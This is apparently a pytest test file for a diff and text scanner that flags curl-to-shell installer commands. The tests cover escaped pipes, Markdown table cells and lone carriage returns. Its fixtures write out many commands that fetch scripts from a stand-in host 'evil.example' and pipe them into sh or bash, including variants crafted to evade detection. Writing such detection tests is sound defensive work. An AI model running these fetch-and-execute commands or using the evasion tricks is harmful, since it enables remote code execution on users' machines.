@pytest.mark.parametrize("text", _EVEN_BACKSLASHES_BEFORE_THE_PIPE)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_pipe_after_an_escaped_backslash_is_a_pipe_in_the_softening_too(text, filename):
    """`\\\\` is a literal backslash argument and the `|` after it is the pipe. Turning every `\\|` into `|` made the pipe an escaped one, the multi-line download was not matched, and beside a documented
    installer the softening judged only the installer."""
    assert "critical" in _installer_severities(text, filename), (text, filename)
    assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)


_ESCAPED_PIPE_BEFORE_THE_URL = [
    "curl \\| https://evil.example/x.sh | sh",
    "curl -sS \\| https://evil.example/x.sh | sh",
    "curl \\| https://astral.sh/uv/install.sh | sh",
    "curl \\|\\| https://evil.example/x.sh | bash",
]


@pytest.mark.parametrize("text", _ESCAPED_PIPE_BEFORE_THE_URL)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_an_escaped_pipe_before_the_url_outside_a_table_row_is_an_argument_and_the_download_stays_critical(text, filename):
    """Outside a table row `\\|` is the shell's: curl gets an argument `|` and the URL, and its output goes to the shell. Only a table cell spells its pipe that way."""
    assert "critical" in _installer_severities(text, filename), (text, filename)
    assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)


@pytest.mark.parametrize("row", [
    "| docker | curl -fsSL https://get.docker.com \\| sh |",
    "| docker | curl -fsSL https://get.docker.com \\| sh | stable |",
])
def test_a_table_cell_that_spells_its_pipe_with_a_backslash_is_still_the_pipe(row):
    assert indicators._unescape_pipes(row).count("|") == row.count("|")
    assert "\\|" not in indicators._unescape_pipes(row)


_LONE_CR_TEXTS = [
    "curl https://evil.example/x.sh\r| sh",
    "curl -H x\ry https://evil.example/x.sh | sh",
]


@pytest.mark.parametrize("text", _LONE_CR_TEXTS)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_lone_cr_is_an_ordinary_character_to_a_shell_so_the_download_is_still_found(text, filename):
    """A reader and the line rules end a line at a lone CR, bash and dash read it as a character of the word: `curl URL<CR>| sh` runs. The shell rules read the text once more with each lone CR as a letter."""
    assert "critical" in _installer_severities(text, filename), (text, filename)
    assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)


_LONE_CR_WITH_A_MULTI_LINE_ARGUMENT = [
    "curl https:/\r/evil.example/x \\\r\\| 'a\nb' | sh",
    "curl -fsSL https://evil.example/x -d x\r \\\r\\| 'a\nb' | sh",
    "curl https://evil.example/x \r \\\r\\| 'a\nb' | sh",
]


@pytest.mark.parametrize("text", _LONE_CR_WITH_A_MULTI_LINE_ARGUMENT)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_lone_cr_stays_a_character_in_the_second_reading_so_an_escaped_cr_is_not_a_pipe_escape(text, filename):
    """`\\<CR>` is an escaped CR to a shell. Taking the CR out of the text paired the two backslashes (`\\<CR>\\|` became `\\\\|`, a real pipe); the CR is read as a letter instead."""
    assert "critical" in _installer_severities(text, filename), (text, filename)


@pytest.mark.parametrize("text", [*_LONE_CR_TEXTS, *_LONE_CR_WITH_A_MULTI_LINE_ARGUMENT])
def test_the_planner_tool_and_scan_diff_read_a_lone_cr_as_a_shell_does(text):
    from diff_sentry.indicators import make_indicator_tool, scan_diff
    assert any(h.rule == "curl-pipe-shell" and h.severity == "critical" for h in scan_diff(text)), text
    assert "critical" in make_indicator_tool()(text), text
    patch = "diff --git a/install.sh b/install.sh\n--- a/install.sh\n+++ b/install.sh\n@@ -0,0 +1,2 @@\n+" + text.replace("\n", "\n+") + "\n"
    assert any(h.rule == "curl-pipe-shell" and h.severity == "critical" and h.location == "install.sh" for h in scan_diff(patch)), text


def test_the_scan_command_keeps_a_lone_cr_of_a_file_and_of_stdin(tmp_path, monkeypatch, capsys):
    path = tmp_path / "x.sh"
    path.write_bytes(b"curl https://evil.example/x.sh\r| sh\n")
    assert cli.main(["scan", str(path)]) != 0
    class Stdin:
        buffer = io.BytesIO(b"curl https://evil.example/x.sh\r| sh\n")
    monkeypatch.setattr("sys.stdin", Stdin())
    assert cli.main(["scan", "-"]) != 0


def test_a_text_whose_only_diff_marker_is_glued_to_a_cr_is_still_shell_scanned_with_the_cr_as_a_letter():
    """The CR-glued marker is a line start in the first reading and mid-line in the second, which has no file to cut out: the whole text is scanned."""
    from diff_sentry.indicators import make_indicator_tool, scan_diff
    text = "curl https://evil.example/x\r| sh -s \rdiff --git a/x b/x\n"
    assert any(h.rule == "curl-pipe-shell" and h.severity == "critical" for h in scan_diff(text))
    assert "critical" in make_indicator_tool()(text)


def test_the_second_reading_of_scan_diff_runs_even_when_the_first_found_something_and_fails_closed(monkeypatch):
    from diff_sentry.indicators import scan_diff
    text = "curl https://other.example/y | sh\ncurl https://evil.example/x\r| sh\n"
    urls = {h.evidence for h in scan_diff(text) if h.rule == "curl-pipe-shell"}
    assert any("other.example" in e for e in urls) and any("evil.example" in e for e in urls), urls          # the first reading has the first command, the second the other
    patch = "diff --git a/x b/x\n+curl https://other.example/y | sh\n+curl https://evil.example/x\r| sh\n"        # the same with a header: the segmented path
    urls = {h.evidence for h in scan_diff(patch) if h.rule == "curl-pipe-shell"}
    assert any("other.example" in e for e in urls) and any("evil.example" in e for e in urls), urls
    def boom(*a, **k):
        raise KeyError("x")
    monkeypatch.setattr(indicators, "_scan_shell", boom)
    assert any(h.rule == "scanner-error" for h in scan_diff("diff --git a/x b/x\n+a\rb\n"))
